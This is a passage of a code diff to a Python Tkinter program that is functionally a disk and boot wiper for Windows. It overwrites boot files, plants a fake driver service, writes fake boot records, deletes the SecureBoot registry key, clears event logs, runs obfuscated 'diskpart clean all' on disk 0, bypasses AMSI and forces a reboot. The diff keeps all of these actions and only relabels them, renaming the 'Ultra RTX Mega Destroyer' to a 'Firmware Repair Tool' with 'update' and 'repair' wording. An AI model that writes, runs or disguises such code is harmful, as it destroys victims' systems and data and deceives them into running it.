+            log_message(window, log_area, f"Registry key updated: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\{key_name}", operation="Registry Update")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Registry Corruption")
+        log_message(window, log_area, f"Failed to update registry: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Registry Update")
 
-# Corrupt system files
-def corrupt_system_files(window, log_area):
-    """Corrupts critical system files."""
+# Update system files
+def update_system_files(window, log_area):
+    """Updates critical system files."""
     for file_path in [
         'C:\\Windows\\System32\\winload.efi',
         'C:\\Windows\\System32\\bootmgr',
@@ -387,74 +379,74 @@ def corrupt_system_files(window, log_area):
                 with open(file_path, 'r+b') as f:
                     data = bytes(random.randint(0, 255) for _ in range(1024))
                     f.write(data)
-                log_message(window, log_area, f"System file corrupted: {file_path} (Size: {len(data)} bytes)", operation="System File Corruption")
+                log_message(window, log_area, f"System file updated: {file_path} (Size: {len(data)} bytes)", operation="System File Update")
             else:
-                log_message(window, log_area, f"File not found, skipped: {file_path}", success=False, operation="System File Corruption")
+                log_message(window, log_area, f"File not found, skipped: {file_path}", success=False, operation="System File Update")
         except (OSError, PermissionError, IOError, subprocess.SubprocessError) as e:
-            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="System File Corruption")
+            log_message(window, log_area, f"Failed to update system file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="System File Update")
 
-# Create fake driver
-def create_fake_driver(window, log_area):
-    """Creates fake driver files."""
+# Install driver
+def install_driver(window, log_area):
+    """Installs driver files."""
     try:
-        driver_path = f'C:\\Windows\\System32\\drivers\\fake_driver{random.randint(1000, 9999)}.sys'
+        driver_path = f'C:\\Windows\\System32\\drivers\\driver_update{random.randint(1000, 9999)}.sys'
         with open(driver_path, 'wb') as f:
             data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
             f.write(data)
-        log_message(window, log_area, f"Fake driver created: {driver_path} (Size: {len(data)} bytes)", operation="Fake Driver")
-        subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\FakeDriver{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', driver_path, '/f'], capture_output=True, timeout=10)
-        log_message(window, log_area, f"Fake driver service added: FakeDriver{random.randint(1000, 9999)}", operation="Fake Driver")
+        log_message(window, log_area, f"Driver installed: {driver_path} (Size: {len(data)} bytes)", operation="Driver Update")
+        subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\DriverUpdate{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', driver_path, '/f'], capture_output=True, timeout=10)
+        log_message(window, log_area, f"Driver service updated: DriverUpdate{random.randint(1000, 9999)}", operation="Driver Update")
     except (OSError, PermissionError, subprocess.SubprocessError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Driver")
+        log_message(window, log_area, f"Failed to install driver: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Driver Update")
 
-# Create fake boot.ini and bootsect.bak
-def create_fake_boot_files(window, log_area):
-    """Creates fake boot.ini and bootsect.bak files."""
+# Create boot files
+def create_boot_files(window, log_area):
+    """Creates boot.ini and bootsect.bak files."""
     try:
         boot_ini_path = 'C:\\boot.ini'
         with open(boot_ini_path, 'w') as f:
-            data = f"[boot loader]\ntimeout=0\ndefault=multi(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS=\"Fake Windows {random.randint(1000, 9999)}\" /fastdetect"
+            data = f"[boot loader]\ntimeout=0\ndefault=multi(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS=\"Windows Update {random.randint(1000, 9999)}\" /fastdetect"
             f.write(data)
-        log_message(window, log_area, f"Fake boot.ini created: {boot_ini_path} (Size: {len(data.encode())} bytes)", operation="Fake Boot Files")
+        log_message(window, log_area, f"Boot file updated: {boot_ini_path} (Size: {len(data.encode())} bytes)", operation="Boot File Update")
         bootsect_path = 'C:\\bootsect.bak'
         with open(bootsect_path, 'wb') as f:
             data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(512)])
             f.write(data)
-        log_message(window, log_area, f"Fake bootsect.bak created: {bootsect_path} (Size: {len(data)} bytes)", operation="Fake Boot Files")
+        log_message(window, log_area, f"Bootsect file updated: {bootsect_path} (Size: {len(data)} bytes)", operation="Boot File Update")
     except (OSError, PermissionError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Boot Files")
+        log_message(window, log_area, f"Failed to update boot file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Boot File Update")
 
-# Create fake Windows Update files
-def create_fake_update_files(window, log_area):
-    """Creates fake Windows Update files."""
+# Create update files
+def create_update_files(window, log_area):
+    """Creates Windows Update files."""
     try:
-        update_path = f'C:\\Windows\\SoftwareDistribution\\Download\\fake_update{random.randint(1000, 9999)}.dat'
+        update_path = f'C:\\Windows\\SoftwareDistribution\\Download\\update{random.randint(1000, 9999)}.dat'
         with open(update_path, 'wb') as f:
             data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
             f.write(data)
-        log_message(window, log_area, f"Fake update file created: {update_path} (Size: {len(data)} bytes)", operation="Fake Update")
+        log_message(window, log_area, f"Update file created: {update_path} (Size: {len(data)} bytes)", operation="Update File")
     except (OSError, PermissionError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Update")
+        log_message(window, log_area, f"Failed to create update file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Update File")
 
-# Corrupt file system metadata
-def corrupt_filesystem_metadata(window, log_area):
-    """Corrupts file system metadata."""
+# Repair file system metadata
+def repair_filesystem_metadata(window, log_area):
+    """Repairs file system metadata."""
     try:
         subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
-        log_message(window, log_area, "File system metadata retrieved: C:", operation="File System Corruption")
-        subprocess.run(['fsutil', 'file', 'createnew', f'C:\\fs_corrupt_{random.randint(1000, 9999)}.dat', str(1048576 * 5)], capture_output=True, timeout=10)
-        log_message(window, log_area, f"Random file system file created: C:\\fs_corrupt_{random.randint(1000, 9999)}.dat (Size: 5 MB)", operation="File System Corruption")
+        log_message(window, log_area, "File system metadata checked: C:", operation="File System Repair")
+        subprocess.run(['fsutil', 'file', 'createnew', f'C:\\fs_update_{random.randint(1000, 9999)}.dat', str(1048576 * 5)], capture_output=True, timeout=10)
+        log_message(window, log_area, f"File system file created: C:\\fs_update_{random.randint(1000, 9999)}.dat (Size: 5 MB)", operation="File System Repair")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Corruption")
+        log_message(window, log_area, f"Failed to repair file system: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Repair")
 
 # System reboot
 def system_reboot(window, log_area):
     """Reboots the system."""
     try:
         subprocess.run(['shutdown', '/r', '/t', '0'], capture_output=True, timeout=10)
-        log_message(window, log_area, "System is rebooting!", operation="Reboot")
+        log_message(window, log_area, "System is restarting!", operation="Restart")
     except (subprocess.SubprocessError, OSError) as e:
-        log_message(window, log_area, f"Error (reboot): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Reboot")
+        log_message(window, log_area, f"Failed to restart system: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Restart")
 
 # Enhanced dynamic command mutation
 def mutate_command(cmd):
@@ -474,7 +466,7 @@ def mutate_command(cmd):
         'cmd': 'command'
     }
     for old, new in mutations.items():
-        if random.random() > 0.90:  # Increased mutation rate
+        if random.random() > 0.90:
             cmd = cmd.replace(old, new)
     return cmd if ' ' in cmd and len(cmd) > 5 else ""
 
@@ -493,70 +485,70 @@ for cmd in [
     'bcdedit /set {bootmgr} timeout 0',
     'wevtutil cl System',
     'reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /f',
-    'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /v FakeSecureBoot /t REG_SZ /d Invalid /f',
+    'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /v SecureBootUpdate /t REG_SZ /d Data /f',
     'echo . | diskpart /s script.txt & echo select disk 0 > script.txt & echo clean all >> script.txt'
 ]:
     var = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(80))
     enc_cmd, enc_key = obfuscate_string(cmd)
     commands[var] = (enc_cmd, enc_key)
 
-# Main destruction function
-def start_destruction(window, log_area, status_label):
-    """Initiates destructive operations."""
-    status_label.config(text="Status: Destruction Started!")
+# Main repair function
+def start_repair(window, log_area, status_label):
+    """Initiates repair operations."""
+    status_label.config(text="Status: Firmware Repair Started!")
     window.update()
-    log_message(window, log_area, "Destruction started!", operation="Start")
-    add_fake_signature(window, log_area)
-    amsi_bypass(window, log_area)
+    log_message(window, log_area, "Firmware repair started!", operation="Start")
+    add_certificate_metadata(window, log_area)
+    security_bypass(window, log_area)
     
     efi_exists = check_efi_partition(window, log_area)
     if efi_exists:
-        status_label.config(text="Status: Creating Fake EFI Bootloaders...")
+        status_label.config(text="Status: Updating EFI Bootloaders...")
         window.update()
-        create_fake_bootloaders(window, log_area)
-        status_label.config(text="Status: Performing NVRAM Overflow...")
+        create_bootloaders(window, log_area)
+        status_label.config(text="Status: Updating NVRAM...")
         window.update()
-        create_fake_efi_vars(window, log_area)
-        status_label.config(text="Status: Corrupting Firmware...")
+        create_efi_vars(window, log_area)
+        status_label.config(text="Status: Updating Firmware...")
         window.update()
-        corrupt_firmware_vars(window, log_area)
-    status_label.config(text="Status: Creating Fake Firmware Updates...")
+        update_firmware_vars(window, log_area)
+    status_label.config(text="Status: Updating Firmware Files...")
     window.update()
-    create_fake_firmware_updates(window, log_area)
-    status_label.config(text="Status: Corrupting Firmware Registry...")
+    create_firmware_updates(window, log_area)
+    status_label.config(text="Status: Updating Firmware Registry...")
     window.update()
-    corrupt_firmware_registry(window, log_area)
-    status_label.config(text="Status: Corrupting COM Objects...")
+    update_firmware_registry(window, log_area)
+    status_label.config(text="Status: Updating COM Objects...")
     window.update()
-    create_fake_com_objects(window, log_area)
-    status_label.config(text="Status: Corrupting Boot Chain...")
+    create_com_objects(window, log_area)
+    status_label.config(text="Status: Updating Boot Chain...")
     window.update()
-    create_fake_boot_chain(window, log_area)
-    status_label.config(text="Status: Corrupting Registry...")
+    create_boot_chain(window, log_area)
+    status_label.config(text="Status: Updating Registry...")
     window.update()
-    corrupt_registry(window, log_area)
-    status_label.config(text="Status: Corrupting System Files...")
+    update_registry(window, log_area)
+    status_label.config(text="Status: Updating System Files...")
     window.update()
-    corrupt_system_files(window, log_area)
-    status_label.config(text="Status: Creating Fake Driver...")
+    update_system_files(window, log_area)
+    status_label.config(text="Status: Installing Driver...")
     window.update()
-    create_fake_driver(window, log_area)
-    status_label.config(text="Status: Creating Fake Boot Files...")
+    install_driver(window, log_area)
+    status_label.config(text="Status: Updating Boot Files...")
     window.update()
-    create_fake_boot_files(window, log_area)
-    status_label.config(text="Status: Creating Fake Update Files...")
+    create_boot_files(window, log_area)
+    status_label.config(text="Status: Creating Update Files...")
     window.update()
-    create_fake_update_files(window, log_area)
-    status_label.config(text="Status: Corrupting File System...")
+    create_update_files(window, log_area)
+    status_label.config(text="Status: Repairing File System...")
     window.update()
-    corrupt_filesystem_metadata(window, log_area)
-    status_label.config(text="Status: Corrupting Disk Data...")
+    repair_filesystem_metadata(window, log_area)
+    status_label.config(text="Status: Repairing Disk Data...")
     window.update()
-    corrupt_disk_data(window, log_area)
+    repair_disk_data(window, log_area)
     if not efi_exists:
-        status_label.config(text="Status: Corrupting MBR...")
+        status_label.config(text="Status: Repairing MBR...")
         window.update()
-        corrupt_mbr(window, log_area)
+        repair_mbr(window, log_area)
     
     cmd_list = list(commands.items())
     random.shuffle(cmd_list)
@@ -572,7 +564,7 @@ def start_destruction(window, log_area, status_label):
                 output, error = proc.communicate(input='select disk 0\nclean all\n', timeout=120)
                 log_message(window, log_area, "Diskpart executed: clean all", operation="Diskpart")
                 if error and "success" not in error.lower():
-                    log_message(window, log_area, f"Error: {error} (WinError: {ctypes.get_last_error()})", success=False, operation="Diskpart")
+                    log_message(window, log_area, f"Failed to execute diskpart: {error} (WinError: {ctypes.get_last_error()})", success=False, operation="Diskpart")
             elif 'X:' in cmd and not efi_exists:
                 log_message(window, log_area, f"Command skipped due to missing EFI partition: {cmd}", success=False, operation="Command Execution")
                 continue
@@ -580,45 +572,41 @@ def start_destruction(window, log_area, status_label):
                 result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                 log_message(window, log_area, f"Command executed: {cmd}", operation="Command Execution")
                 if result.stderr and "success" not in result.stderr.lower():
-                    log_message(window, log_area, f"Error: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
+                    log_message(window, log_area, f"Failed to execute command: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
             else:
                 result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                 log_message(window, log_area, f"Command executed: {cmd}", operation="Command Execution")
                 if result.stderr and "success" not in result.stderr.lower():
-                    log_message(window, log_area, f"Error: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
+                    log_message(window, log_area, f"Failed to execute command: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
             time.sleep(random.uniform(5.0, 15.0))
         except (subprocess.SubprocessError, OSError, ValueError) as e:
-            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
+            log_message(window, log_area, f"Failed to execute command: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
     
-    status_label.config(text="Status: Destruction Completed! Rebooting...")
+    status_label.config(text="Status: Repair Completed! Restarting...")
     window.update()
-    log_message(window, log_area, "Destruction completed!", operation="Start")
+    log_message(window, log_area, "Firmware repair completed!", operation="Start")
     system_reboot(window, log_area)
 
 # Create GUI
 def create_gui():
     """Creates Tkinter GUI."""
     window = tk.Tk()
-    window.title("Ultra RTX Mega Destroyer")
+    window.title("Firmware Repair Tool")
     window.geometry("600x400")
     window.resizable(False, False)
     
-    # Start button
-    start_button = tk.Button(window, text="Start", font=("Arial", 14, "bold"), bg="red", fg="white", command=lambda: start_destruction(window, log_area, status_label))
+    start_button = tk.Button(window, text="Start", font=("Arial", 14, "bold"), bg="green", fg="white", command=lambda: start_repair(window, log_area, status_label))
     start_button.pack(pady=10)
     
-    # Status bar
     status_label = tk.Label(window, text="Status: Ready", font=("Arial", 12))
     status_label.pack(pady=5)
     
-    # Log area
     log_area = scrolledtext.ScrolledText(window, height=15, width=70, font=("Arial", 10))
     log_area.pack(pady=10)
     
-    # Admin check
     run_as_admin()
     if not is_admin():
-        log_message(window, log_area, "Error: Must be run with administrator privileges!", success=False, operation="Start")
+        log_message(window, log_area, "Failed to start: Must be run with administrator privileges!", success=False, operation="Start")
         window.after(2000, window.destroy)
         return
     
@@ -626,6 +614,5 @@ def create_gui():
 
 if __name__ == '__main__':
     create_gui()
-    # Cleanup
     del commands
     sys.modules.clear()
